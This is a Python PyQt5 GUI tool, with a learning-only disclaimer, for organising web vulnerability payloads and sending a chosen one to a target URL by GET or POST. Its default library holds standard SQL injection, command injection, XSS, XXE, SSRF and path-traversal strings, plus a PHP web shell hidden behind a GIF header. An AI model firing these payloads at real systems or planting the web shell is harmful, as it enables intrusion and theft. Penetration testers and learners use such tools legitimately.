#仅供学习使用，切勿用于非法活动
"""
漏洞payload管理
作者：Charizard_xy
功能：管理payload
"""
# -*- coding: utf-8 -*-
import sys
import io
import json
import requests
import locale
from PyQt5.QtWidgets import *
from PyQt5.QtCore import Qt, QThread, pyqtSignal

# 设置系统编码
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
locale.setlocale(locale.LC_ALL, 'zh_CN.UTF-8')

class PayloadTester(QThread):
    test_result_signal = pyqtSignal(dict)

    def __init__(self, target_url, payload, method, param_name):
        super().__init__()
        self.target_url = target_url
        self.payload = payload
        self.method = method
        self.param_name = param_name
        self.session = requests.Session()

    def run(self):
        try:
            if self.method == "GET":
                params = {self.param_name: self.payload}
                response = self.session.get(self.target_url, params=params, timeout=10)
            else:
                data = {self.param_name: self.payload}
                response = self.session.post(self.target_url, data=data, timeout=10)

            result = {
                'success': True,
                'status_code': response.status_code,
                'length': len(response.text),
                'content': response.text[:500] + "..." if len(response.text) > 500 else response.text
            }
        except Exception as e:
            result = {'success': False, 'error': str(e)}
        
        self.test_result_signal.emit(result)

class PayloadManager(QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.load_data()
        
    def init_ui(self):
        self.setWindowTitle('漏洞Payload管理')
        self.setGeometry(300, 300, 1200, 800)
        self.setup_style()
        self.setup_layout()
        self.setup_context_menu()
        self.create_toolbar()
        self.setup_search()
        self.setup_font()
    
    def setup_font(self):
        font = self.font()
        font.setFamily("Microsoft YaHei")
        font.setPointSize(10)
        self.setFont(font)
    
    def setup_style(self):
        self.setStyleSheet("""
            QMainWindow { background-color: #003B4D; }
            QTreeWidget, QListWidget, QTextEdit {
                background-color: #004D60; color: #E0F4FF;
                border: 1px solid #006680; font-size: 14px;
            }
            QMenu, QToolBar {
                background-color: #005266; color: #FFFFFF;
                border: 1px solid #007799; font-size: 14px;
            }
            QLineEdit {
                background: #004552; color: #E0F4FF;
                padding: 8px; border: 1px solid #006680;
                border-radius: 4px;
            }
            QGroupBox {
                color: #80DDFF; font-size: 16px;
                border: 1px solid #007799; margin-top: 10px;
                padding-top: 15px;
            }
            QPushButton {
                background-color: #0088A3; color: white;
                padding: 8px; border-radius: 4px; min-width: 100px;
            }
            QPushButton:hover { background-color: #0099B3; }
        """)
    
    def setup_layout(self):
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QHBoxLayout(main_widget)
        
        # 漏洞分类树
        self.vuln_tree = QTreeWidget()
        self.vuln_tree.setHeaderLabels(["漏洞分类"])
        self.vuln_tree.itemDoubleClicked.connect(self.show_payloads)
        layout.addWidget(self.vuln_tree, 30)
        
        # 右侧面板
        right_layout = QVBoxLayout()
        
        # Payload列表
        self.payload_list = QListWidget()
        self.payload_list.setContextMenuPolicy(Qt.CustomContextMenu)
        self.payload_list.customContextMenuRequested.connect(self.payload_context_menu)
        right_layout.addWidget(self.payload_list, 70)
        
        # 测试面板
        self.setup_test_panel(right_layout)
        layout.addLayout(right_layout, 70)
    
    def setup_search(self):
        search_box = QHBoxLayout()
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("搜索Payload...")
        self.search_input.textChanged.connect(self.search_payloads)
        search_box.addWidget(self.search_input)
        self.centralWidget().layout().insertLayout(0, search_box)
    
    def setup_test_panel(self, layout):
        test_group = QGroupBox("Payload测试")
        test_layout = QVBoxLayout()
        
        # 测试参数
        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("目标URL："))
        self.test_url_input = QLineEdit()
        url_layout.addWidget(self.test_url_input)
        
        param_layout = QHBoxLayout()
        param_layout.addWidget(QLabel("参数名称："))
        self.param_name_input = QLineEdit()
        param_layout.addWidget(self.param_name_input)
        
        method_layout = QHBoxLayout()
        method_layout.addWidget(QLabel("请求方法："))
        self.http_method_combo = QComboBox()
        self.http_method_combo.addItems(["GET", "POST"])
        method_layout.addWidget(self.http_method_combo)
        
        # 测试结果
        self.test_result_display = QTextEdit()
        self.test_result_display.setReadOnly(True)
        
        # 测试按钮
        test_btn = QPushButton("测试选中Payload")
        test_btn.clicked.connect(self.start_test)
        
        test_layout.addLayout(url_layout)
        test_layout.addLayout(param_layout)
        test_layout.addLayout(method_layout)
        test_layout.addWidget(test_btn)
        test_layout.addWidget(self.test_result_display)
        test_group.setLayout(test_layout)
        layout.addWidget(test_group)
    
    def create_toolbar(self):
        toolbar = QToolBar()
        self.addToolBar(Qt.TopToolBarArea, toolbar)
        toolbar.addAction(QAction("添加大类", self, triggered=self.add_main_category))
        toolbar.addAction(QAction("导入", self, triggered=self.import_payloads))
        toolbar.addAction(QAction("导出", self, triggered=self.export_payloads))
    
    def load_data(self):
        try:
            with open('payloads.json', 'r', encoding='utf-8') as f:
                self.data = json.load(f)
        except FileNotFoundError:
            self.data = {
                "注入类漏洞": {
                    "SQL注入": ["' OR 1=1--", "' UNION SELECT null, version()--"],
                    "命令注入": ["; ls -al", "| cat /etc/passwd"],
                    "模板注入": ["{{7*7}}", "<%= 7 * 7 %>"]
                },
                "跨站类漏洞": {
                    "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
                    "CSRF": ["<img src='http://site.com/delete?all=true'>"]
                },
                "文件相关漏洞": {
                    "文件包含": ["../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
                    "文件上传": ["shell.php.jpg", "GIF89a<?php system($_GET['cmd']); ?>"],
                    "路径遍历": ["....//....//etc/passwd", "%252e%252e%252fetc%252fpasswd"]
                },
                "服务端漏洞": {
                    "SSRF": ["http://internal.server", "gopher://127.0.0.1:6379/_*3%0d%0a..."],
                    "反序列化": ["rO0ABXcEAAAAAA==", "O:4:\"Test\":0:{}"],
                    "XXE": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"]
                },
                "配置类漏洞": {
                    "信息泄露": ["/server-status", "/.git/config"],
                    "认证绕过": ["admin=1;", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0..."]
                }
            }
            self.save_data()
        self.update_category_tree()
    
    def save_data(self):
        with open('payloads.json', 'w', encoding='utf-8') as f:
            json.dump(self.data, f, indent=4, ensure_ascii=False)
    
    def update_category_tree(self):
        self.vuln_tree.clear()
        for main_category, sub_categories in self.data.items():
            main_item = QTreeWidgetItem(self.vuln_tree, [main_category])
            for sub_category in sub_categories:
                QTreeWidgetItem(main_item, [sub_category])
        self.vuln_tree.expandAll()
    
    def show_payloads(self, item):
        if item.parent():
            main_category = item.parent().text(0)
            sub_category = item.text(0)
            self.payload_list.clear()
            self.payload_list.addItems(self.data[main_category].get(sub_category, []))
    
    def search_payloads(self):
        query = self.search_input.text().lower()
        results = []
        for main_category, sub_categories in self.data.items():
            for sub_category, payloads in sub_categories.items():
                for p in payloads:
                    if query in p.lower():
                        results.append(f"{main_category} > {sub_category}: {p}")
        self.payload_list.clear()
        self.payload_list.addItems(results)
    
    def import_payloads(self):
        path, _ = QFileDialog.getOpenFileName(self, "导入Payload", "", "文本文件 (*.txt)")
        if path and (current_item := self.vuln_tree.currentItem()) and current_item.parent():
            main_category = current_item.parent().text(0)
            sub_category = current_item.text(0)
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    new_payloads = [line.strip() for line in f if line.strip()]
                    self.data[main_category][sub_category].extend(new_payloads)
                    self.save_data()
                    self.show_payloads(current_item)
            except Exception as e:
                QMessageBox.critical(self, "错误", str(e))
    
    def export_payloads(self):
        if (path := QFileDialog.getSaveFileName(self, "导出Payload", "", "文本文件 (*.txt)")[0]) and \
           (current_item := self.vuln_tree.currentItem()) and current_item.parent():
            main_category = current_item.parent().text(0)
            sub_category = current_item.text(0)
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(self.data[main_category][sub_category]))
            except Exception as e:
                QMessageBox.critical(self, "错误", str(e))
    
    def start_test(self):
        if (selected := self.payload_list.currentItem()) and \
           (url := self.test_url_input.text()) and \
           (param := self.param_name_input.text()):
            payload = selected.text().split(": ")[-1]
            self.test_result_display.clear()
            self.worker = PayloadTester(url, payload, self.http_method_combo.currentText(), param)
            self.worker.test_result_signal.connect(self.show_test_result)
            self.worker.start()
    
    def show_test_result(self, result):
        if result['success']:
            text = f"""<b>测试成功！</b><br>
            状态码: {result['status_code']}<br>
            响应长度: {result['length']}<br>
            内容摘要:<br>{result['content']}"""
        else:
            text = f"<b>错误：</b> {result['error']}"
        self.test_result_display.setHtml(text)
    
    def setup_context_menu(self):
        self.vuln_tree.setContextMenuPolicy(Qt.CustomContextMenu)
        self.vuln_tree.customContextMenuRequested.connect(self.tree_context_menu)
    
    def tree_context_menu(self, pos):
        menu = QMenu()
        item = self.vuln_tree.itemAt(pos)
        if item:
            if item.parent():  # 子分类项
                menu.addAction("添加Payload", lambda: self.add_payload(item))
                menu.addAction("删除子分类", lambda: self.delete_subcategory(item))
            else:  # 主分类项
                menu.addAction("添加子分类", lambda: self.add_subcategory(item))
                menu.addAction("删除大类", lambda: self.delete_main_category(item))
        else:  # 空白区域
            menu.addAction("添加大类", self.add_main_category)
        menu.exec_(self.vuln_tree.viewport().mapToGlobal(pos))
    
    def add_main_category(self):
        category, ok = QInputDialog.getText(self, "新建大类", "请输入漏洞大类名称：")
        if ok and category and category not in self.data:
            self.data[category] = {}
            self.save_data()
            self.update_category_tree()
    
    def delete_main_category(self, item):
        category = item.text(0)
        if QMessageBox.Yes == QMessageBox.question(
            self, "确认删除", f"确定要删除 {category} 及其所有子分类和Payload吗？",
            QMessageBox.Yes | QMessageBox.No
        ):
            del self.data[category]
            self.save_data()
            self.update_category_tree()
    
    def add_subcategory(self, parent_item):
        subcat, ok = QInputDialog.getText(self, "新建子分类", "请输入子分类名称：")
        if ok and subcat:
            main_category = parent_item.text(0)
            self.data[main_category][subcat] = []
            self.save_data()
            self.update_category_tree()
    
    def delete_subcategory(self, item):
        main_category = item.parent().text(0)
        subcat = item.text(0)
        if QMessageBox.Yes == QMessageBox.question(
            self, "确认删除", f"确定要删除 {main_category} > {subcat} 及其所有Payload吗？",
            QMessageBox.Yes | QMessageBox.No
        ):
            del self.data[main_category][subcat]
            self.save_data()
            self.update_category_tree()
    
    def add_payload(self, item):
        main_category = item.parent().text(0)
        subcat = item.text(0)
        payload, ok = QInputDialog.getText(self, "添加Payload", "请输入新的Payload：")
        if ok and payload:
            self.data[main_category][subcat].append(payload)
            self.save_data()
            self.show_payloads(item)
    
    def payload_context_menu(self, pos):
        if selected := self.payload_list.currentItem():
            menu = QMenu()
            menu.addAction("删除Payload", self.delete_payload)
            menu.exec_(self.payload_list.viewport().mapToGlobal(pos))
    
    def delete_payload(self):
        if (selected := self.payload_list.currentItem()) and \
           (current_item := self.vuln_tree.currentItem()) and \
           current_item.parent():
            main_category = current_item.parent().text(0)
            subcat = current_item.text(0)
            payload = selected.text().split(": ")[-1]
            if QMessageBox.Yes == QMessageBox.question(
                self, "确认删除", f"确定要删除Payload：{payload}吗？", 
                QMessageBox.Yes | QMessageBox.No
            ):
                self.data[main_category][subcat].remove(payload)
                self.save_data()
                self.show_payloads(current_item)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = PayloadManager()
    window.show()
    sys.exit(app.exec_())
#仅供学习使用，切勿用于非法活动
